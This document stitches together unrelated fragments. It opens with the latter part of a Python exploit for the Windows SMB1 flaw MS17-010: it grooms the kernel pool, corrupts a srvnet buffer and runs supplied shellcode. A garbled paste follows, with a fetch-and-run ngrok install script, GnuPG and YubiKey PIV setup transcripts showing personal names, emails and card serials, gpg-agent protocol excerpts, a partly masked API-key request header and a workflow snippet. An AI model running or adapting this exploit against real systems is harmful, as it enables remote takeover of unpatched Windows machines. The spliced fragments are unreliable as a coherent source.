	# - https://msdn.microsoft.com/en-us/library/cc246328.aspx for NTLMv2 (NTLM SSP) authentication
	#   - GetExtendSecurityParameters() function is resposible for extracting data from this packet format
	
	# These 2 formats have different WordCount (first one is 13 and later is 12). 
	# Here is logic in BlockingSessionSetupAndX() related to this bug
	# - check WordCount for both formats (the CAP_EXTENDED_SECURITY must be set for extended security format)
	# - if FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY are set, process a message as Extend Security request
	# - else, process a message as NT Security request
	
	# So we can send one format but server processes it as another format by controlling FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY.
	# With this confusion, server read a ByteCount from wrong offset to calculating "NativeOS and NativeLanMan size".
	# But GetExtendSecurityParameters() checks ByteCount value again.
	
	# So the only possible request to use the bug is sending Extended Security request but does not set FLAGS2_EXTENDED_SECURITY.
	
	conn = smb.SMB(target, target)
	_, flags2 = conn.get_flags()
	# FLAGS2_EXTENDED_SECURITY MUST not be set
	flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
	if size >= 0xffff:
		flags2 &= ~smb.SMB.FLAGS2_UNICODE
		reqSize = size // 2
	else:
		flags2 |= smb.SMB.FLAGS2_UNICODE
		reqSize = size
	conn.set_flags(flags2=flags2)
	
	pkt = smb.NewSMBPacket()

	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

	sessionSetup['Parameters']['MaxBufferSize']      = 61440  # can be any value greater than response size
	sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
	sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
	sessionSetup['Parameters']['SessionKey']         = 0
	sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
	# UnicodePasswordLen field is in Reserved for extended security format. 0 for NULL session
	sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY  # can add other flags

	sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20
	pkt.addCommand(sessionSetup)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('SMB1 session setup allocate nonpaged pool success')
	else:
		print('SMB1 session setup allocate nonpaged pool failed')
	return conn


# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(conn, tid, data, displacement):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	# assume no params

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

	transCommand['Parameters']['TotalParameterCount'] = 0
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+18
	transCommand['Data']['Pad1'] = ''

	transCommand['Parameters']['ParameterCount'] = 0
	transCommand['Parameters']['ParameterOffset'] = 0

	if len(data) > 0:
		pad2Len = (4 - fixedOffset % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = len(data)
	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
	transCommand['Parameters']['DataDisplacement'] = displacement

	transCommand['Data']['Trans_Parameters'] = ''
	transCommand['Data']['Trans_Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)


def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
	# Here is another bug in MS17-010.
	# To call transaction subcommand, normally a client need to use correct SMB commands as documented in
	#   https://msdn.microsoft.com/en-us/library/ee441514.aspx
	# If a transaction message is larger than SMB message (MaxBufferSize in session parameter), a client 
	#   can use *_SECONDARY command to send transaction message. When sending a transaction completely with
	#   *_SECONDARY command, a server uses the last command that complete the transaction.
	# For example:
	# - if last command is SMB_COM_NT_TRANSACT_SECONDARY, a server executes subcommand as NT_TRANSACT_*.
	# - if last command is SMB_COM_TRANSACTION2_SECONDARY, a server executes subcommand as TRANS2_*.
	#
	# Without MS17-010 patch, a client can mix a transaction command if TID, PID, UID, MID are the same.
	# For example:
	# - a client start transaction with SMB_COM_NT_TRANSACT command
	# - a client send more transaction data with SMB_COM_NT_TRANSACT_SECONDARY and SMB_COM_TRANSACTION2_SECONDARY
	# - a client sned last transactino data with SMB_COM_TRANSACTION2_SECONDARY
	# - a server executes transaction subcommand as TRANS2_* (first 2 bytes of Setup field)
	
	# From https://msdn.microsoft.com/en-us/library/ee442192.aspx, a maximum data size for sending a transaction 
	#   with SMB_COM_TRANSACTION2 is 65535 because TotalDataCount field is USHORT
	# While a maximum data size for sending a transaction with SMB_COM_NT_TRANSACT is >65536 because TotalDataCount
	#   field is ULONG (see https://msdn.microsoft.com/en-us/library/ee441534.aspx).
	# Note: a server limit SetupCount+TotalParameterCount+TotalDataCount to 0x10400 (in SrvAllocationTransaction)
	
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	command = pack('<H', setup)
	
	# Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = '\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = firstDataFragmentSize
	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

	transCommand['Data']['Trans_Parameters'] = param
	transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	conn.recvSMB() # must be success
	
	# Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
	i = firstDataFragmentSize
	while i < len(data):
		# limit data to 4096 bytes per SMB message because this size can be used for all Windows version
		sendSize = min(4096, len(data) - i)
		if len(data) - i <= 4096:
			if not sendLastChunk:
				break
		send_trans2_second(conn, tid, data[i:i+sendSize], i)
		i += sendSize
	
	if sendLastChunk:
		conn.recvSMB()
	return i

	
# connect to target and send a large nbss size with data 0x80 bytes
# this method is for allocating big nonpaged pool (no need to be same size as overflow buffer) on target
# a nonpaged pool is allocated by srvnet.sys that started by useful struct (especially after overwritten)
def createConnectionWithBigSMBFirst80(target):
	# https://msdn.microsoft.com/en-us/library/cc246496.aspx
	# Above link is about SMB2, but the important here is first 4 bytes.
	# If using wireshark, you will see the StreamProtocolLength is NBSS length.
	# The first 4 bytes is same for all SMB version. It is used for determine the SMB message length.
	#
	# After received first 4 bytes, srvnet.sys allocate nonpaged pool for receving SMB message.
	# srvnet.sys forwards this buffer to SMB message handler after receiving all SMB message.
	# Note: For Windows 7 and Windows 2008, srvnet.sys also forwards the SMB message to its handler when connection lost too.
	sk = socket.create_connection((target, 445))
	# For this exploit, use size is 0x11000
	pkt = '\x00' + '\x00' + pack('>H', 0xfff7)
	# There is no need to be SMB2 because we got code execution by corrupted srvnet buffer.
	# Also this is invalid SMB2 message.
	# I believe NSA exploit use SMB2 for hiding alert from IDS
	#pkt += '\xfeSMB' # smb2
	# it can be anything even it is invalid
	pkt += 'BAAD' # can be any
	pkt += '\x00'*0x7c
	sk.send(pkt)
	return sk


def exploit(target, shellcode, numGroomConn):
	# force using smb.SMB for SMB1
	conn = smb.SMB(target, target)

	# can use conn.login() for ntlmv2
	conn.login_standard('', '')
	server_os = conn.get_server_os()
	print('Target OS: '+server_os)
	if not (server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith("Windows Vista")):
		print('This exploit does not support this target')
		sys.exit()
	

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
	
	# The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
	# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
	progress = send_big_trans2(conn, tid, 0, feaList, '\x00'*30, 2000, False)
	# we have to know what size of NtFeaList will be created when last fragment is sent

	# make sure server recv all payload before starting allocate big NonPaged
	#sendEcho(conn, tid, 'a'*12)

	# create buffer size NTFEA_SIZE-0x1000 at server
	# this buffer MUST NOT be big enough for overflown buffer
	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
	
	# groom nonpaged pool
	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
	srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)

	# create buffer size NTFEA_SIZE at server
	# this buffer will be replaced by overflown buffer
	holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
	# disconnect allocConn to free buffer
	# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
	allocConn.get_socket().close()

	# hope one of srvnetConn is next to holeConn
	for i in range(5):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)
		
	# send echo again, all new 5 srvnet buffers should be created
	#sendEcho(conn, tid, 'a'*12)
	
	# remove holeConn to create hole for fea buffer
	holeConn.get_socket().close()

	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	send_trans2_second(conn, tid, feaList[progress:], progress)
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	# retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag
	if retStatus == 0xc000000d:
		print('good response status: INVALID_PARAMETER')
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))
		

	# one of srvnetConn struct header should be modified
	# a corrupted buffer will write recv data in designed memory address
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)

	# execute shellcode by closing srvnet connection
	for sk in srvnetConn:
		sk.close()

	# nicely close connection (no need for exploit)
	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()


if len(sys.argv) < 3:
	print("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
	sys.exit(1)

TARGET=sys.argv[1]
numGroomConn = 13 if len(sys.argv) < 4 else int(sys.argv[3])

fp = open(sys.argv[2], 'rb')
sc = fp.read()
fp.close()

print('shellcode size: {:d}'.format(len(sc)))
print('numGroomConn: {:d}'.format(numGroomConn))

exploit(TARGET, sc, numGroomConn)
print('done')

https://github.com/6309304695/OVERSEER-GRATEFUL345I.git
              #000006 $ Breadcrumbs X 4
wget --no-check-certificate https://github.com/clangcn/ngrok-one-key-install/raw/master/install_ngrok.sh -O ./install_ngrok.sh
chmod 500 ./install_ngrok.sh
./install_ngrok.sh install	
服务器管理
 gpg/card> writecert PIV.9C < sign.crt
+# MS17-010
+# 000006
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - [verified] -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.co
+ m>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+ PIV authentication’ key with ssh:
+
+$ ssh-add -l
+384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
+ssh-add with the uppercase ‘-L
+$ gpgsm --learn
+$ gpg --full-gen-key
+Please select what kind of key you want:
+   (1) RSA and RSA (default)
+   (2) DSA and Elgamal
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 3
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name: keith bieszczat
+Email address: 6309304695z@gmail.com
+Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
+You selected this USER-ID:
+    "6309304695z@gmail.com"
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
+gpg: key C3AFA9ED971BB365 marked as ultimately trusted
+gpg: revocation certificate stored as '[...]D971BB365.rev'
+public and secret key created and signed.
+
+Note that this key cannot be used for encryption.  You may want to use
+the command "--edit-key" to generate a subkey for this purpose.
+pub   rsa2048 2019-04-04 [SC]
+      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid                      6309304695z@gmail.com
+
+ run gpg in --expert mode
+ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+Secret key is available.
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net
+gpg> addkey
+Secret parts of primary key are stored on-card.
+Please select what kind of key you want:
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+   (5) Elgamal (encrypt only)
+   (6) RSA (encrypt only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 4
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+Really create? (y/N) y
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+ssb  rsa2048/7067860A98FCE6E1
+     created: 2019-04-04  expires: never       usage: E
+     card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net
+
+gpg> save
+ 
+/* 32A19-D90712   
+LEVEL-5 CLEARANCE ONLY
+ ‘--force’
+authentication key 
+-header-'010203040506070801020304050607080102030405060708'
+SETDATA hexstring
+to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
+
+  PKSIGN keyid
+where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
+
+  PKSIGN --hash=algoname keyid
+READKEY hexified_certid
+READCERT hexified_certid|keyid
+SERIALNO
+Return the serial number of the card using a status response like:
+
+  S SERIALNO D27600000000000000000000
+ WRITEKEY [--force] keyid
+SETDATA hexstring
+to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
+
+  PKDECRYPT keyid
+CHECKPIN idstr
+RESTART
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+
+./configure --sysconfdir=/etc --localstatedir=/va
+CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
+  A6935DD34EF3087973C706FC311AA2CCF733765B S
+
+  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
+  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
+
+  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
+  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
+  
+       # Key added on: 2011-07-20 20:38:46
+       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
+       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/
+gpg-connect-agent 'help COMMAND' /bye
+SETKEY <keyGrip>
+Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.
+
+  PKDECRYPT
+The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
+
+    S: INQUIRE CIPHERTEXT
+    C: D (xxxxxx
+    C: D xxxx)
+    C: END
+Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
+
+     (enc-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.
+
+If the decryption was successful the decrypted data is returned by means of "D" lines.
+
+Here is an example session:
+
+   C: PKDECRYPT
+   S: INQUIRE CIPHERTEXT
+   C: D (enc-val elg (a 349324324)
+   C: D    (b 3F444677CA)))
+   C: END
+   S: # session key follows
+   S: S PADDING 0
+   S: D (value 1234567890ABCDEF0)
+   S: OK decryption successful
+The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
+SIGKEY <keyGrip>
+This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
+
+   SETHASH --hash=<name>|<algo> <hexstring>
+sig-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+The operation is affected by the option
+
+   OPTION use-cache-for-signing=0|1
+The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+
+Here is an example session:
+
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: PKSIGN
+   S: # I did ask the user whether he really wants to sign
+   S: # I did ask the user for the passphrase
+   S: INQUIRE HASHVAL
+   C: D ABCDEF012345678901234
+   C: END
+   S: # signature follows
+   S: D (sig-val rsa (s 45435453654612121212))
+   S: OK
+  GENKEY [--no-protection] [--preset] [<cache_nonce>]
+Invokes the key generation process and the server will then inquire on the generation parameters, like:
+
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+The format of the key parameters which depends on the algorithm is of the form:
+
+    (genkey
+      (algo
+        (parameter_name_1 ....)
+          ....
+        (parameter_name_n ....)))
+If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:
+
+     (public-key
+       (rsa
+   (n <mpi>)
+   (e <mpi>)))
+Here is an example session:
+
+   C: GENKEY
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+   S: D (public-key
+   S: D   (rsa (n 326487324683264) (e 10001)))
+   S  OK key created
+    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
+LISTTRUSTED
+GpgAgent returns a list of trusted keys line by line:
+
+    S: D 000000001234454556565656677878AF2F1ECCFF P
+    S: D 340387563485634856435645634856438576457A P
+    S: D FEDC6532453745367FD83474357495743757435D S
+    S: OK
+The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
+Ok
+Finally a client should be able to mark a key as trusted:
+
+   MARKTRUSTED fingerprint "P"|"S"
+The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
+
+   S: INQUIRE TRUSTDESC
+   C: D Do you trust the key with the fingerprint @FPR@
+   C: D bla fasel blurb.
+   C: END
+   S: OK
+GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
+                 [--qualitybar] cache_id                \
+                 [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]
+
+HAVEKEY keygrips
+  GET_CONFIRMATION description
+  LEARN [--send]
+UPDATESTARTUPTTY
+SETDATA hexstring
+
+
+  PKSIGN keyid
+
+
+  PKSIGN --hash=algoname keyid
+
+READCERT hexified_certid|keyid
+READKEY hexified_certid
+SETDATA hexstring
+d
+
+  PKSIGN keyid
+ LEARN
+
+  PKSIGN --hash=algoname keyid
+
+WRITEKEY [--force] keyid
+WRITEKEY [--force] keyid
+PASSWD [--reset] [--nullpin] chvno
+CHECKPIN idstr
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+this:
+
+     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import 
+
+command --locate-external-key
+command --locate-external-key
+github/workflows/release.yml:
+ldap://keys.(thedomain)
+‘--auto-key-locate
+ --auto-key-locate
+--auto-key-retrieve
+
+
+ honor-keyserver-url 
+
+-sig-keyserver-url
+--recv-key
+honor-keyserver-url
+--use-agent
+--gpg-agent-info
+
+
+--no-random-seed-file
+Host: c7-use-3.algolianet. com
+Accept: */*
+Sec-Fetch-Site: cross-site
+Accept-Language: en-US, en; q=0.9
+Accept-Encoding: gzip, deflate, br
+Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
+Origin: https://dashboard.algolia.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
+x-algolia-api-key: b3cf*************************米**
+Content-Length: 27
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Sec-Fetch-Dest: empty
+
+scdaemon.conf
+1
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+--debug-level level
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+scd-event
+HKCU\Software\GNU\GnuPG:HomeDir
+HKCU\Software\GNU\GnuPG:DefaultLogFile,
+reader_n.status
+HKCU\Software\GNU\GnuPG:HomeDir
+
+trustlist.txt file
+gpg-agent.conf
+HKCU\Software\GNU\GnuPG:HomeDir
+name: release
+debug-pinentry 
+--debug 1024
+
+global trustlist (/usr/local/etc/gnupg/trustlist.tx
+
+Active cards
+Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
+gpg-connect-agent updatestartuptty /bye
+Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:
+
+gpg-connect-agent /bye
+--scdaemon-program filename
+Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
+--check-passphrase-pattern file
+--check-sym-passphrase-pattern file
+Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
+bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
+Keys listed in the sshcontrol file
+--disable-extended-key-format
+These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.
+
+--enable-ssh-support
+--enable-win32-openssh-support
+--enable-putty-support
+
+gpg-connect-agent 'GETINFO s2k_count' /bye
+gpg-connect-agent 'GETINFO s2k_time' /bye
+To view the auto-calibrated count use:
+
+gpg-connect-agent 'GETINFO s2k_count_cal' /bye
+--ssh-fingerprint-digest
+Keys listed in the sshcontrol file
+
+Active card
+gpg-connect-agent /bye
+bashrc or whatever initialization file is used for all shell invocations:
+
+GPG_TTY=$(tty)
+export GPG_TTY
+--daemon [command line]
+server
+
+agent-program file ¶
+Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.
+
+--gpg-program file
+Specify a non-default gpg binary to be used by certain commands.
+
+--gpgsm-program file
+Specify a non-default gpgsm binary to be used by certain commands.
+
+--chuid uid
+Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.
+
+gpg-card
+AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
+AUTH
+FETCH
+GENERATE [--force] [--algo=algo{+algo2}] keyref
+KDF-SETUP ¶
+Prepare the OpenPGP card KDF feature for this card.
+
+LANG [--clear]
+Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.
+
+LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
+NAME [--clear]
+PRIVATEDO [--clear] n [< file] file
+READCERT [--openpgp] certref > file ¶
+Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
+URL [--clear]
+gpg's. --fetch 
+WRITECERT certref < file ¶
+WRITECERT --openpgp certref [< file|fpr]
+WRITECERT --clear certref
+ --openpgp
+file 
+fpr.
+WRITEKEY [--force] keyref keygrip ¶
+Write a private key object identified by keygrip to the card under the id keyref.
+CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
+Serial number
+A hex-string with the serial number of the card.
+
+Type
+This gives the type of the card’s application. For example "OpenPGP" or "PIV".
+
+Keygrip
+A hex-string identifying a key.
+
+Keyref
+The application slot where the key is stored on the card. For example "OpenPGP.1"
+
+Status
+The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.
+
+YUBIKEY cmd args
+Various commands pertaining to Yubikey tokens with cmd being:
+
+LIST
+List supported and enabled Yubikey applications.
+
+ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
+DISABLE
+Enable or disable the specified or all applications on the given interface.
+
+The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.
+
+GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:
+
+Authentication key
+This is a 24 byte key described by the hex string
+010203040506070801020304050607080102030405060708.
+
+PIV Application PIN
+This is the string 123456.
+
+PIN Unblocking Key
+This is the string 12345678.
+list (the string gpg/card>
+card> list
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: D2760001240102010006090746250000
+Application type .: OpenPGP
+Version ..........: 2.1
+[...]
+on:
+  push:
+    tags:
+      - "v*"
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: cli/gh-extension-precompile@v1
+        with:
+          go_version: "1.16"
+Then
+- uses: cli/gh-extension-precompile@v1
+  env:
